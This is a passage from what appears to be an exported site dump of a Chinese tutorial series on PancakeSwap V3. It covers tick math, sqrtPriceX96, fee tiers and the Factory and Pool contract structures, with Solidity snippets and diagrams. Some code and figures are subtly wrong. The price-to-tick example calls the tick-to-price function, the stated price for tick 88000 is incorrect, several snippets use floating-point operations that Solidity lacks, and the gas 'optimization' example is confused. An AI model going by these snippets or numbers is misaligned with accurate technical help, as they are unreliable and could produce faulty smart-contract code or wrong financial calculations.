V3&quot;]\n\n    style C fill:#ffeb3b\n    style G fill:#ffeb3b\n\n选择PancakeSwap V3的场景：\n\n交易在BNB Chain上进行\n需要极低的gas成本\n想要参与PancakeSwap生态（农场、IFO等）\n重视社区治理参与\n使用CAKE作为主要资产\n\n选择Uniswap V3的场景：\n\n交易在Ethereum主网上进行\n需要最大的流动性深度\n重视协议的标准化程度\n机构级应用需求\n\n\n5. PancakeSwap V3的技术特色\n5.1 Gas优化\nPancakeSwap V3在BNB Chain上天然享有gas优势：\ngraph LR\n    subgraph Ethereum[&quot;Ethereum Gas成本&quot;]\n        E1[Swap: ~$10-50]\n        E2[Add Liquidity: ~$50-200]\n        E3[Remove Liquidity: ~$30-100]\n    end\n\n    subgraph BNBChain[&quot;BNB Chain Gas成本&quot;]\n        B1[Swap: ~$0.05-0.5]\n        B2[Add Liquidity: ~$0.2-1.5]\n        B3[Remove Liquidity: ~$0.1-1.0]\n    end\n\n    Ethereum --&gt;|100-200x| BNBChain\n\n    style BNBChain fill:#c8e6c9\n\n5.2 代码优化\nPancakeSwap V3在Uniswap V3基础上进行了代码优化：\n// PancakeSwap V3的优化示例\ncontract PancakeV3Pool is IERC721, IUniswapV3PoolState {\n    // 1. 更优化的存储布局\n    struct Slot0 {\n        uint160 sqrtPriceX96;\n        int24 tick;\n        uint16 observationIndex;\n        uint16 observationCardinality;\n        uint16 observationCardinalityNext;\n        uint8 feeProtocol;\n        bool unlocked;\n    }\n \n    // 2. 改进的gas优化\n    modifier lock() {\n        require(unlocked, &quot;LOCKED&quot;);\n        unlocked = false;\n        _;\n        unlocked = true;\n    }\n}\n5.3 向后兼容性\nPancakeSwap V3保持了与V2的兼容性：\ngraph LR\n    subgraph V2[&quot;PancakeSwap V2&quot;]\n        V2P[传统池]\n        V2L[ERC20 LP]\n        V2S[简单接口]\n    end\n\n    subgraph V3[&quot;PancakeSwap V3&quot;]\n        V3P[集中流动性池]\n        V3L[NFT LP]\n        V3S[高级功能]\n    end\n\n    subgraph Bridge[&quot;迁移工具&quot;]\n        M1[LP迁移合约]\n        M2[一键迁移]\n        M3[无缝转换]\n    end\n\n    V2 --&gt;|可选迁移| Bridge --&gt; V3\n\n    style V3 fill:#ffeb3b\n\n\n6. PancakeSwap V3的实际应用\n6.1 使用场景\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;使用场景))\n    交易者\n      代币兑换\n      套利交易\n      MEV策略\n    流动性提供者\n      做市收益\n      费用收入\n      CAKE奖励\n    开发者\n      DApp集成\n      聚合器构建\n      工具开发\n    用户\n      低成本交易\n      参与农场\n      IFO参与\n\n6.2 成功案例\n\n稳定币交易：USDT/USDC池提供极低费率（0.01%）\n主流币对：CAKE/BNB、ETH/BNB等提供深度流动性\n新币发行：通过IFO与V3池结合，提高流动性效率\n跨链套利：利用多链部署进行跨链套利\n\n\n7. 本章小结\n7.1 PancakeSwap V3核心特点\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;核心特点))\n    集中流动性\n      自定义价格区间\n      资本效率提升\n      精确风险管理\n    多链部署\n      BNB Chain主阵地\n      Ethereum扩展\n      更多链计划\n    灵活费率\n      0.01%-1.00%\n      自定义选择\n      社区治理\n    生态整合\n      农场激励\n      IFO发行\n      CAKE治理\n    成本优势\n      BNB Chain低gas\n      代码优化\n      向后兼容\n\n7.2 关键概念回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念定义重要性集中流动性LP在自定义价格区间提供流动性V3的核心创新多链部署同时在多个区块链上运行Pancake的战略优势灵活费率支持多种费率等级选择适应不同需求CAKE治理通过CAKE代币参与协议治理社区驱动特色生态整合与农场、IFO等深度集成提供完整DeFi体验\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Tick机制与价格数学，包括：\n\nTick的数学定义与设计原理\n价格与Tick的双向转换算法\nQ64.96定点数格式详解\nPancakeSwap V3中的TickMath库实现\n\n\n参考资料\n\nPancakeSwap V3 官方文档\nPancakeSwap V3 Core 源码\nPancakeSwap V3 白皮书\nPancakeSwap V3 vs Uniswap V3 对比\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/02-Tick机制与价格数学":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/02-Tick机制与价格数学","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/02-Tick机制与价格数学.md","title":"02-Tick机制与价格数学","links":[],"tags":[],"content":"死磕PancakeSwap V3（二）：Tick机制与价格数学\n\n本文是「死磕PancakeSwap V3」系列的第二篇，深入探讨Tick机制的设计原理和价格数学的核心算法。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. Tick机制概述\n1.1 为什么需要Tick？\n在传统AMM中，价格是连续的实数。但在区块链上，我们需要：\n\n高效存储：连续价格需要无限存储\n快速计算：整数运算远快于浮点运算\n精确定位：方便LP设定价格区间边界\n\nflowchart LR\n    subgraph Problems[&quot;问题&quot;]\n        P1[&quot;连续价格空间&lt;br/&gt;[0, ∞]&quot;]\n        P2[&quot;无限精度需求&quot;]\n        P3[&quot;存储成本高&quot;]\n        P4[&quot;计算效率低&quot;]\n    end\n\n    subgraph Solutions[&quot;解决方案&quot;]\n        S1[&quot;离散化价格空间&quot;]\n        S2[&quot;Tick索引系统&quot;]\n        S3[&quot;紧凑存储&quot;]\n        S4[&quot;整数运算&quot;]\n    end\n\n    P1 --&gt; S1\n    P2 --&gt; S2\n    P3 --&gt; S3\n    P4 --&gt; S4\n\n    style Solutions fill:#ffeb3b\n\n1.2 Tick的数学定义\n核心公式：\nprice = 1.0001^tick\n\n这意味着：\n\n每个Tick代表**0.01%**的价格变化\n相邻Tick的价格比为 1.0001（即100.01%）\n\ngraph TB\n    subgraph TickRange[&quot;Tick范围&quot;]\n        MIN[&quot;MIN_TICK = -887272&quot;]\n        ZERO[&quot;TICK = 0&lt;br/&gt;price = 1&quot;]\n        MAX[&quot;MAX_TICK = 887272&quot;]\n    end\n\n    MIN --&gt;|&quot;价格递增&quot;| ZERO\n    ZERO --&gt;|&quot;价格递增&quot;| MAX\n\n    subgraph PriceMapping[&quot;价格对应&quot;]\n        PMIN[&quot;最小价格 ≈ 2.94e-39&quot;]\n        P1[&quot;price = 1.0001^0 = 1&quot;]\n        PMAX[&quot;最大价格 ≈ 3.40e+38&quot;]\n    end\n\n    MIN -.-&gt; PMIN\n    ZERO -.-&gt; P1\n    MAX -.-&gt; PMAX\n\n1.3 Tick间距（Tick Spacing）\nPancakeSwap V3支持不同的Tick间距，与费率等级绑定：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率Tick间距最小价格变化PancakeSwap特点0.01%10.01%适用于稳定币对0.05%100.10%适用于相关资产0.25%500.50%PancakeSwap独有1.00%2002.00%适用于高风险资产\nTick间距的意义：\ngraph LR\n    subgraph TickSpacing[&quot;Tick间距&quot;]\n        TS1[&quot;细间距 = 1&quot;]\n        TS2[&quot;中等间距 = 10&quot;]\n        TS3[&quot;粗间距 = 200&quot;]\n    end\n\n    subgraph Implications[&quot;影响&quot;]\n        I1[&quot;价格范围精度&quot;]\n        I2[&quot;LP设置灵活性&quot;]\n        I3[&quot;Gas成本&quot;]\n        I4[&quot;存储效率&quot;]\n    end\n\n    TS1 --&gt;|&quot;高精度&lt;br/&gt;高Gas&quot;| I1\n    TS3 --&gt;|&quot;低精度&lt;br/&gt;低Gas&quot;| I3\n\n    style TS1 fill:#ffeb3b\n    style TS3 fill:#c8e6c9\n\n\n2. 价格的平方根表示\n2.1 为什么使用√price？\nPancakeSwap V3不直接存储价格，而是存储价格的平方根（sqrtPrice）：\nflowchart TD\n    subgraph DirectPriceProblems[&quot;直接存储价格的问题&quot;]\n        A1[&quot;价格可能极大或极小&quot;]\n        A2[&quot;乘法容易溢出&quot;]\n        A3[&quot;AMM公式大量涉及√P&quot;]\n    end\n\n    subgraph SqrtPriceAdvantages[&quot;存储√price的优势&quot;]\n        B1[&quot;数值范围更稳定&quot;]\n        B2[&quot;减少溢出风险&quot;]\n        B3[&quot;简化公式计算&quot;]\n        B4[&quot;更高精度&quot;]\n    end\n\n    A1 --&gt; B1\n    A2 --&gt; B2\n    A3 --&gt; B3\n\n    style SqrtPriceAdvantages fill:#ffeb3b\n\n2.2 Q64.96定点数格式\nPancakeSwap V3使用Q64.96定点数格式存储√price：\ngraph LR\n    subgraph SqrtPriceX96Format[&quot;uint160 sqrtPriceX96&quot;]\n        I[&quot;整数部分&lt;br/&gt;64位&quot;]\n        D[&quot;小数部分&lt;br/&gt;96位&quot;]\n    end\n\n    I --&gt; R1[&quot;范围: 0 ~ 2^64&quot;]\n    D --&gt; R2[&quot;精度: 2^-96&quot;]\n\n    subgraph ActualValueCalc[&quot;实际值计算&quot;]\n        F[&quot;实际√price = sqrtPriceX96 / 2^96&quot;]\n    end\n\n    I --&gt; F\n    D --&gt; F\n\n    style SqrtPriceX96Format fill:#ffeb3b\n\n格式优势：\n\n精度：2^-96 ≈ 1.26×10^-29，足以满足金融计算需求\n范围：uint160可存储所有可能的√price值\n效率：避免浮点运算，使用整数运算\n\n\n3. 价格与Tick的双向转换\n3.1 从Tick到价格\n// PancakeSwap V3 - TickMath库\nfunction getSqrtRatioAtTick(int24 tick) internal pure returns (uint160) {\n    require(tick &gt;= MIN_TICK, &quot;T&quot;);\n    require(tick &lt;= MAX_TICK, &quot;T&quot;);\n \n    uint256 absTick = tick &lt; 0 ? uint256(-int256(tick)) : uint256(int256(tick));\n \n    uint256 ratio = absTick &amp; 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;\n    if (absTick &amp; 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) &gt;&gt; 128;\n    if (absTick &amp; 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) &gt;&gt; 128;\n    // ... 更多二进制分解\n \n    if (tick &gt; 0) ratio = type(uint256).max / ratio;\n \n    return uint160((ratio &gt;&gt; 32) + (ratio % (1 &lt;&lt; 32) == 0 ? 0 : 1));\n}\n算法核心：\nflowchart TB\n    A[&quot;输入: tick&quot;] --&gt; B[&quot;计算绝对值&quot;]\n    B --&gt; C{&quot;tick是奇数?&quot;}\n    C --&gt;|是| D[&quot;乘以基数 1.0001&quot;]\n    C --&gt;|否| E[&quot;保持为1&quot;]\n    D --&gt; F[&quot;处理二进制位&quot;]\n    E --&gt; F\n    F --&gt; G{&quot;tick &gt; 0?&quot;}\n    G --&gt;|是| H[&quot;取倒数&quot;]\n    G --&gt;|否| I[&quot;直接使用&quot;]\n    H --&gt; J[&quot;输出: sqrtPriceX96&quot;]\n    I --&gt; J\n\n    style J fill:#ffeb3b\n\n3.2 从价格到Tick\nfunction getTickAtSqrtRatio(uint160 sqrtPriceX96) internal pure returns (int24 tick) {\n    require(sqrtPriceX96 &gt;= MIN_SQRT_RATIO, &quot;R&quot;);\n    require(sqrtPriceX96 &lt; MAX_SQRT_RATIO, &quot;R&quot;);\n \n    uint256 ratio = sqrtPriceX96 &lt;&lt; 32;\n \n    uint256 r = ratio;\n    uint256 msb = 0;\n \n    assembly {\n        let f := shl(7, gt(r, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))\n        msb := or(msb, f)\n        r := shr(f, r)\n        // ... 位运算计算最高有效位\n    }\n \n    // 精确计算tick\n    tick = int24(log2(ratio) / log2(1.0001));\n \n    // 调整边界\n    if (tick &lt; 0 &amp;&amp; getSqrtRatioAtTick(tick) &gt; sqrtPriceX96) {\n        tick--;\n    }\n}\n3.3 实际示例\n示例1：计算Tick=0对应的价格\ntick = 0\nprice = 1.0001^0 = 1\nsqrtPrice = sqrt(1) = 1\nsqrtPriceX96 = 1 * 2^96 ≈ 79228162514264337593543950336\n示例2：计算Tick=88000对应的价格\ntick = 88000\nprice = 1.0001^88000 ≈ 5975.88\nsqrtPrice = sqrt(5975.88) ≈ 77.30\nsqrtPriceX96 = 77.30 * 2^96 ≈ 6125124126885564738730673942912\n\n4. Tick在流动性管理中的应用\n4.1 LP的价格区间设定\n流动性提供者通过设定tickLower和tickUpper来定义价格区间：\nstruct Position {\n    uint128 liquidity;      // 流动性数量\n    int24 tickLower;        // 下界Tick\n    int24 tickUpper;        // 上界Tick\n    // ... 其他字段\n}\n区间限制：\ngraph TB\n    subgraph Constraints[&quot;Tick间距限制&quot;]\n        C1[&quot;tickLower必须&lt;br/&gt;是tickSpacing的整数倍&quot;]\n        C2[&quot;tickUpper必须&lt;br/&gt;是tickSpacing的整数倍&quot;]\n        C3[&quot;tickLower &lt; tickUpper&quot;]\n    end\n\n    subgraph Example[&quot;示例 (费率0.25%, tickSpacing=50)&quot;]\n        E1[&quot;有效tickLower: -500, -450, -400, ...&quot;]\n        E2[&quot;有效tickUpper: 400, 450, 500, ...&quot;]\n        E3[&quot;无效: -523, 467, ...&quot;]\n    end\n\n    Constraints --&gt; Example\n\n    style Example fill:#ffeb3b\n\n4.2 价格区间与资产状态\nstateDiagram-v2\n    [*] --&gt; BelowRange: 当前tick &lt; tickLower\n    [*] --&gt; InRange: tickLower ≤ tick ≤ tickUpper\n    [*] --&gt; AboveRange: tick &gt; tickUpper\n\n    BelowRange --&gt; OnlyToken0: 只持有Token0\n    InRange --&gt; MixedHolding: 持有Token0 + Token1\n    AboveRange --&gt; OnlyToken1: 只持有Token1\n\n    state BelowRange as &quot;价格在区间下方&quot;\n    state InRange as &quot;价格在区间内&lt;br/&gt;流动性活跃&quot;\n    state AboveRange as &quot;价格在区间上方&quot;\n    state OnlyToken0 as &quot;只持有Token0&quot;\n    state MixedHolding as &quot;混合持有&quot;\n    state OnlyToken1 as &quot;只持有Token1&quot;\n\n    note right of InRange\n        可赚取交易费用\n        资产会自动再平衡\n    end note\n\n\n5. PancakeSwap V3的TickMath库\n5.1 核心常量定义\nlibrary TickMath {\n    // 最小Tick值\n    int24 internal constant MIN_TICK = -887272;\n    // 最大Tick值\n    int24 internal constant MAX_TICK = 887272;\n \n    // 最小sqrtPriceX96值\n    uint160 internal constant MIN_SQRT_RATIO = 4295128739;\n    // 最大sqrtPriceX96值\n    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970341;\n \n    // 基数的平方根 = sqrt(1.0001)\n    uint160 internal constant SQRT_RATIO_1_0001 = 7923311209327299069;\n}\n5.2 Gas优化技巧\nPancakeSwap V3在TickMath中使用了多种Gas优化：\nmindmap\n  root((TickMath&lt;br/&gt;Gas优化))\n    位运算\n      避免乘除法\n      使用位移操作\n      二进制分解\n    查找表\n      预计算幂值\n      快速查找\n      减少重复计算\n    溢出保护\n      使用SafeMath库\n      边界检查\n      类型转换\n    内联函数\n      减少调用开销\n      编译器优化\n      代码内联\n\n优化示例：\n// 不优化：使用乘法\nuint256 result = ratio * 0xfffcb933bd6fad37aa2d162d1a594001;\n \n// 优化：使用位运算\nif (absTick &amp; 0x1 != 0) {\n    ratio = (ratio * 0xfffcb933bd6fad37aa2d162d1a594001) &gt;&gt; 128;\n}\n\n6. 实际应用示例\n6.1 计算LP所需的代币数量\n假设要在CAKE/BNB池添加流动性：\n\n当前价格：20 BNB/CAKE (tick ≈ 72200)\n区间：[18, 22] BNB/CAKE\n流动性：L = 1000\n\n// 1. 将价格转换为tick\nint24 tickLower = getSqrtRatioAtTick(sqrt(18) * 2^96);\nint24 tickUpper = getSqrtRatioAtTick(sqrt(22) * 2^96);\n \n// 2. 计算所需的代币数量\nuint256 amountCake = L * (1/sqrt(18) - 1/sqrt(22));\nuint256 amountBNB = L * (sqrt(22) - sqrt(18));\n \n// 3. 结果\n// amountCake ≈ 2.15 CAKE\n// amountBNB ≈ 0.11 BNB\n6.2 计算滑点\n// 当前价格\nuint160 currentSqrtPriceX96 = getSqrtRatioAtTick(72200);\n \n// 目标价格\nint24 targetTick = 72300;\nuint160 targetSqrtPriceX96 = getSqrtRatioAtTick(targetTick);\n \n// 计算滑点\nuint256 priceChange = (targetSqrtPriceX96 - currentSqrtPriceX96) * 10000 / currentSqrtPriceX96;\n \n// 结果：约1%的价格变化\n\n7. PancakeSwap V3 vs Uniswap V3的Tick机制\n7.1 基本架构相同\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性PancakeSwap V3Uniswap V3Tick公式price = 1.0001^tickprice = 1.0001^ticksqrtPriceX96格式Q64.96Q64.96Tick范围[-887272, 887272][-887272, 887272]TickMath库基本相同标准实现\n7.2 PancakeSwap的优化\ngraph LR\n    subgraph PancakeSwapV3[&quot;PancakeSwap V3优化&quot;]\n        P1[&quot;Gas优化改进&quot;]\n        P2[&quot;额外Tick间距选项&quot;]\n        P3[&quot;更灵活的配置&quot;]\n        P4[&quot;社区驱动的更新&quot;]\n    end\n\n    subgraph Benefits[&quot;优化收益&quot;]\n        B1[&quot;更低的交易成本&quot;]\n        B2[&quot;更精确的区间设置&quot;]\n        B3[&quot;更好的用户体验&quot;]\n        B4[&quot;持续的协议改进&quot;]\n    end\n\n    PancakeSwapV3 --&gt; Benefits\n\n    style PancakeSwapV3 fill:#ffeb3b\n\n\n8. 本章小结\n8.1 Tick机制核心要点\nmindmap\n  root((Tick机制&lt;br/&gt;核心要点))\n    数学基础\n      price = 1.0001^tick\n      Tick间距与费率绑定\n      Q64.96定点数格式\n    价格转换\n      Tick → sqrtPriceX96\n      sqrtPriceX96 → Tick\n      二进制分解算法\n    流动性管理\n      tickLower/tickUpper\n      价格区间设定\n      资产状态切换\n    Gas优化\n      位运算替代乘法\n      预计算查找表\n      溢出保护\n\n8.2 关键概念速查\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念值/公式说明Tick范围[-887272, 887272]支持的价格范围价格公式price = 1.0001^tickTick到价格的转换sqrtPriceX96格式Q64.9664位整数 + 96位小数Tick间距1/10/50/200与费率等级绑定精度2^-96足够金融计算\n\n下一篇预告\n在下一篇文章中，我们将深入探讨架构与合约设计，包括：\n\nPancakeSwap V3的整体架构\nFactory、Pool合约设计\n核心库合约详解\n合约间的交互流程\n\n\n参考资料\n\nPancakeSwap V3 Core 源码\nPancakeSwap V3 TickMath 实现\nUniswap V3 白皮书\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/03-架构与合约设计":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/03-架构与合约设计","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/03-架构与合约设计.md","title":"03-架构与合约设计","links":[],"tags":[],"content":"死磕PancakeSwap V3（三）：架构与合约设计\n\n本文是「死磕PancakeSwap V3」系列的第三篇，深入剖析V3的合约架构和核心数据结构设计。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 整体架构概览\n1.1 合约层次结构\nPancakeSwap V3采用了模块化的架构设计，基于Uniswap V3架构进行了优化：\nflowchart TB\n    subgraph UserLayer[&quot;用户层&quot;]\n        U1[交易者]\n        U2[流动性提供者]\n    end\n\n    subgraph PeripheryContracts[&quot;外围合约 Periphery Contracts&quot;]\n        R[SwapRouter]\n        PM[NonfungiblePositionManager]\n        Q[Quoter]\n    end\n\n    subgraph CoreContracts[&quot;核心合约 Core Contracts&quot;]\n        F[PancakeV3Factory]\n        P1[Pool A]\n        P2[Pool B]\n        P3[Pool C]\n    end\n\n    subgraph Libraries[&quot;库合约 Libraries&quot;]\n        TM[TickMath]\n        SM[SwapMath]\n        POS[Position]\n        TK[Tick]\n        TB[TickBitmap]\n        OR[Oracle]\n    end\n\n    U1 --&gt; R\n    U2 --&gt; PM\n    R --&gt; P1 &amp; P2 &amp; P3\n    PM --&gt; P1 &amp; P2 &amp; P3\n    F --&gt;|创建| P1 &amp; P2 &amp; P3\n    P1 &amp; P2 &amp; P3 --&gt; TM &amp; SM &amp; POS &amp; TK &amp; TB &amp; OR\n\n    style CoreContracts fill:#ffeb3b\n    style Libraries fill:#c8e6c9\n\n1.2 核心设计原则\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;架构设计))\n    模块化\n      接口分离\n      库复用\n      单一职责\n    Gas优化\n      存储槽打包\n      位运算优化\n      内联库函数\n      BNB Chain优化\n    安全性\n      重入保护\n      余额验证\n      权限控制\n    可扩展性\n      工厂模式\n      多费率支持\n      预言机扩容\n      多链适配\n    社区治理\n      DAO控制\n      参数可调\n      透明决策\n\n\n2. Factory合约：单例工厂模式\n2.1 工厂合约的职责\nFactory合约是整个协议的入口点，负责池子的创建和参数管理：\nflowchart LR\n    subgraph FactoryDuties[&quot;Factory职责&quot;]\n        C1[创建Pool]\n        C2[管理费率]\n        C3[设置协议费]\n        C4[所有权管理]\n        C5[白名单管理]\n    end\n\n    subgraph KeyMappings[&quot;关键映射&quot;]\n        M1[&quot;getPool[token0][token1][fee]&quot;]\n        M2[&quot;feeAmountTickSpacing[fee]&quot;]\n    end\n\n    C1 --&gt; M1\n    C2 --&gt; M2\n\n    style FactoryDuties fill:#ffeb3b\n\n2.2 核心数据结构\ncontract PancakeV3Factory is IPancakeV3Factory, PancakeV3PoolDeployer, NoDelegateCall {\n    address public override owner;\n \n    // 三层嵌套映射：确保每个代币对+费率只有一个池子\n    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;\n \n    // 费率与Tick间距的绑定关系\n    mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;\n \n    constructor() {\n        owner = msg.sender;\n        emit OwnerChanged(address(0), msg.sender);\n \n        // PancakeSwap V3 预设费率等级\n        feeAmountTickSpacing[100] = 1;     // 0.01% fee (stable pairs)\n        feeAmountTickSpacing[500] = 10;    // 0.05% fee\n        feeAmountTickSpacing[2500] = 50;   // 0.25% fee (PancakeSwap特色)\n        feeAmountTickSpacing[10000] = 200;  // 1.00% fee\n    }\n}\n2.3 PancakeSwap的费率特色\nPancakeSwap V3提供了比Uniswap V3更丰富的费率选择：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率费用值(bps)Tick间距适用场景0.01%1001稳定币对（USDT/USDC）0.05%50010相关资产（WBTC/renBTC）0.25%250050主流币对（CAKE/BNB）1.00%10000200高风险/长尾资产\n0.25%费率的优势：\ngraph LR\n    subgraph PancakeSwap[&quot;PancakeSwap V3&quot;]\n        P1[&quot;0.25%费率&quot;]\n        P2[&quot;Tick间距50&quot;]\n        P3[&quot;中等精度&quot;]\n        P4[&quot;适合大多数主流币对&quot;]\n    end\n\n    subgraph Uniswap[&quot;Uniswap V3&quot;]\n        U1[&quot;0.30%费率&quot;]\n        U2[&quot;Tick间距60&quot;]\n        U3[&quot;稍低精度&quot;]\n        U4[&quot;标准主流币对&quot;]\n    end\n\n    P1 --&gt;|&quot;更灵活&quot;| U1\n    P2 --&gt;|&quot;更细&quot;| U2\n\n    style PancakeSwap fill:#ffeb3b\n\n2.4 创建池子流程\nflowchart TD\n    A[用户发起createPool] --&gt; B{tokenA &lt; tokenB?}\n    B --&gt;|是| C[token0 = tokenA&lt;br/&gt;token1 = tokenB]\n    B --&gt;|否| D[token0 = tokenB&lt;br/&gt;token1 = tokenA]\n    C --&gt; E{费率有效?}\n    D --&gt; E\n    E --&gt;|否| F[回滚错误]\n    E --&gt;|是| G{池子已存在?}\n    G --&gt;|是| F\n    G --&gt;|否| H[部署Pool合约]\n    H --&gt; I[记录映射关系]\n    I --&gt; J[发射PoolCreated事件]\n    J --&gt; K[返回池子地址]\n\n    style H fill:#ffeb3b\n    style K fill:#c8e6c9\n\n\n3. Pool合约：核心交易池\n3.1 Pool合约的核心职责\nmindmap\n  root((PancakeV3Pool&lt;br/&gt;核心职责))\n    状态管理\n      slot0价格状态\n      流动性跟踪\n      Tick信息\n    交易执行\n      swap交换\n      mint添加流动性\n      burn移除流动性\n      collect收取费用\n    费用管理\n      费用累积\n      协议费分配\n      手续费计算\n    预言机功能\n      价格观察\n      TWAP计算\n      历史数据\n    事件日志\n      Mint事件\n      Burn事件\n      Swap事件\n      Collect事件\n\n3.2 核心数据结构\ncontract PancakeV3Pool is IPancakeV3Pool, NoDelegateCall {\n    // 核心状态槽0：打包存储最常访问的数据\n    struct Slot0 {\n        uint160 sqrtPriceX96;     // 当前价格的平方根\n        int24 tick;               // 当前tick\n        uint16 observationIndex;  // 最新观察索引\n        uint16 observationCardinality;  // 观察数\n        uint16 observationCardinalityNext;  // 下一个观察数\n        uint8 feeProtocol;       // 协议费率\n        bool unlocked;           // 重入锁\n    }\n \n    Slot0 public override slot0;\n \n    // 当前总流动性\n    uint128 public override liquidity;\n \n    // Tick信息映射\n    mapping(int24 =&gt; Tick.Info) public override ticks;\n \n    // 流动性头寸映射\n    mapping(bytes32 =&gt; Position.Info) public override positions;\n \n    // 预言机观察数据\n    Observation[65535] public override observations;\n}\n3.3 Slot0结构优化\ngraph TB\n    subgraph Slot0[&quot;Slot0结构 (256位)&quot;]\n        SP[&quot;sqrtPriceX96&lt;br/&gt;160位&quot;]\n        T[&quot;tick&lt;br/&gt;24位&quot;]\n        OI[&quot;observationIndex&lt;br/&gt;16位&quot;]\n        OC[&quot;observationCardinality&lt;br/&gt;16位&quot;]\n        OCN[&quot;observationCardinalityNext&lt;br/&gt;16位&quot;]\n        FP[&quot;feeProtocol&lt;br/&gt;8位&quot;]\n        UN[&quot;unlocked&lt;br/&gt;1位&quot;]\n        PAD[&quot;填充位&lt;br/&gt;15位&quot;]\n    end\n\n    subgraph Optimization[&quot;优化效果&quot;]\n        O1[&quot;单个存储槽&quot;]\n        O2[&quot;减少gas消耗&quot;]\n        O3[&quot;提高读取速度&quot;]\n        O4[&quot;降低合约大小&quot;]\n    end\n\n    Slot0 --&gt; Optimization\n\n    style Slot0 fill:#ffeb3b\n\n3.4 Tick数据结构\nlibrary Tick {\n    struct Info {\n        uint128 liquidityGross;           // 该tick的总流动性（添加+移除）\n        int128 liquidityNet;              // 该tick的净流动性（添加-移除）\n        uint256 feeGrowthOutside0X128;    // tick外部token0费用增长\n        uint256 feeGrowthOutside1X128;    // tick外部token1费用增长\n        int56 tickCumulativeOutside;      // tick外部累计tick值\n        uint160 secondsPerLiquidityOutsideX128;  // tick外部流动性时间\n        uint32 secondsOutside;            // tick外部时间\n        bool initialized;                 // 是否已初始化\n    }\n}\n3.5 Position数据结构\nlibrary Position {\n    struct Info {\n        uint128 liquidity;              // 该头寸的流动性\n        uint256 feeGrowthInside0LastX128;  // 最后记录的费用增长(token0)\n        uint256 feeGrowthInside1LastX128;  // 最后记录的费用增长(token1)\n        uint128 tokensOwed0;            // 待领取的token0数量\n        uint128 tokensOwed1;            // 待领取的token1数量\n    }\n}\n\n4. 核心库合约\n4.1 TickMath库\ngraph LR\n    subgraph TickMath[&quot;TickMath库&quot;]\n        F1[&quot;getSqrtRatioAtTick&quot;]\n        F2[&quot;getTickAtSqrtRatio&quot;]\n        F3[&quot;MIN_TICK/MAX_TICK&quot;]\n        F4[&quot;MIN_SQRT_RATIO/MAX_SQRT_RATIO&quot;]\n    end\n\n    subgraph Usage[&quot;使用场景&quot;]\n        U1[&quot;价格转换&quot;]\n        U2[&quot;区间验证&quot;]\n        U3[&quot;边界检查&quot;]\n        U4[&quot;计算精度&quot;]\n    end\n\n    TickMath --&gt; Usage\n\n    style TickMath fill:#ffeb3b\n\n4.2 SwapMath库\ngraph LR\n    subgraph SwapMath[&quot;SwapMath库&quot;]\n        F1[&quot;computeSwapStep&quot;]\n        F2[&quot;getGasCostOfMaxCrossedTicks&quot;]\n        F3[&quot;getFeeAmount&quot;]\n    end\n\n    subgraph Usage[&quot;使用场景&quot;]\n        U1[&quot;计算交换步长&quot;]\n        U2[&quot;估算gas成本&quot;]\n        U3[&quot;计算交易费用&quot;]\n        U4[&quot;优化跨tick交换&quot;]\n    end\n\n    SwapMath --&gt; Usage\n\n    style SwapMath fill:#ffeb3b\n\n4.3 TickBitmap库\ngraph LR\n    subgraph TickBitmap[&quot;TickBitmap库&quot;]\n        F1[&quot;flipTick&quot;]\n        F2[&quot;nextInitializedTickWithinOneWord&quot;]\n        F3[&quot;nextTickInSameWord&quot;]\n    end\n\n    subgraph Purpose[&quot;目的&quot;]\n        